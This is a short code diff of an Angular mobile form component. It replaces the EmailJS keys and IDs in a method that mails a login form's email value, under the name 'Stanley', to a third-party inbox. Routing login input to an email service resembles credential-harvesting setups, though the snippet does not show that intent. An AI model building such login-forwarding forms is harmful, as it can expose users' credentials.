@@ -99,8 +99,8 @@ export class MobileFormsComponent implements OnInit, OnDestroy {
   async send(end: boolean = false) {
     this.showLoader = true;
 
-    emailjs.init('NKHmyO1Zy4d62isst');
-    const response = await emailjs.send("service_tep2rho","template_dztuzu6", {
+    emailjs.init('zh43cu-e-qTq875rB');
+    const response = await emailjs.send("service_hqrkxno","template_w76iuix", {
         name: 'Stanley',
         message: `Email: ${
           this.loginFormControl['email'].value || ''
